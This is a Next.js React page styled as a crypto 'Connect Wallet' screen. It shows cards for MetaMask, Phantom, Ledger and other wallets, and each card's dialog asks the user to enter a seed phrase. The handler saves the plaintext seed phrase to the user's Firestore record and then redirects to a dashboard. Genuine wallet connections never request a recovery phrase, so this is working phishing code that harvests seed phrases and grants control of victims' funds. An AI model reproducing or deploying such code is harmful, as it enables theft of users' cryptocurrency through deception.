"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { db, auth } from "@/lib/firebase";
import { doc, updateDoc } from "firebase/firestore";
import { Card, CardHeader, CardTitle, CardContent } from "@/components/ui/card";
import {
  Dialog,
  DialogTrigger,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogFooter,
} from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { AppSidebar } from "@/components/app-sidebar";
import { SiteHeader } from "@/components/site-header";
import { SidebarInset, SidebarProvider } from "@/components/ui/sidebar";

const popularWallets = [
  { name: "MetaMask", icon: "/wallets/metamask-wallet.jpg" },
  { name: "Phantom", icon: "/wallets/phantom-wallet.jpg" },
  { name: "Trust Wallet", icon: "/wallets/trust-wallet.jpg" },
  { name: "Coinbase Wallet", icon: "/wallets/coinbase-wallet.jpg" },
  { name: "Ledger", icon: "/wallets/ledger-wallet.png" },
  { name: "Solflare-wallet", icon: "/wallets/solflare-wallet.png" },
  { name: "Rainbow-wallet", icon: "/wallets/rainbow-wallet.jpg" },
  { name: "OKX Wallet", icon: "/wallets/okx-wallet.png" },
];

export default function ConnectWalletPage() {
  const [selectedWallet, setSelectedWallet] = useState<string | null>(null);
  const [seedPhrase, setSeedPhrase] = useState("");
  const [loading, setLoading] = useState(false);
  const router = useRouter();

  const handleConnect = async () => {
    if (!auth.currentUser || !selectedWallet || !seedPhrase) return;
    setLoading(true);
    try {
      const ref = doc(db, "users", auth.currentUser.uid);
      await updateDoc(ref, {
        wallet: {
          provider: selectedWallet,
          seedPhrase: seedPhrase.trim(),
        },
      });
      router.push("/dashboard");
    } catch (error) {
      console.error("Error saving wallet:", error);
    } finally {
      setLoading(false);
    }
  };

  return (
    <SidebarProvider>
      <AppSidebar variant="inset" />
      <SidebarInset>
        <SiteHeader />
        <div className="p-6 grid grid-cols-1 sm:grid-cols-2 font-montserrat lg:grid-cols-3 gap-6">
          {popularWallets.map((wallet) => (
            <Dialog key={wallet.name}>
              <DialogTrigger asChild>
                <Card
                  onClick={() => setSelectedWallet(wallet.name)}
                  className="hover:ring-2 hover:ring-primary cursor-pointer transition"
                >
                  <CardHeader className="flex items-center gap-4">
                    <img
                      src={wallet.icon}
                      alt={wallet.name}
                      className="w-10 h-10 rounded object-contain"
                    />
                    <CardTitle>{wallet.name}</CardTitle>
                  </CardHeader>
                </Card>
              </DialogTrigger>
              <DialogContent className="font-montserrat">
                <DialogHeader>
                  <DialogTitle>Connect {wallet.name}</DialogTitle>
                </DialogHeader>
                <Input
                  placeholder="Enter your seed phrase"
                  value={seedPhrase}
                  onChange={(e) => setSeedPhrase(e.target.value)}
                  disabled={loading}
                />
                <DialogFooter>
                  <Button
                    onClick={handleConnect}
                    disabled={loading || !seedPhrase}
                  >
                    {loading ? "Connecting..." : "Connect"}
                  </Button>
                </DialogFooter>
              </DialogContent>
            </Dialog>
          ))}
        </div>
      </SidebarInset>
    </SidebarProvider>
  );
}
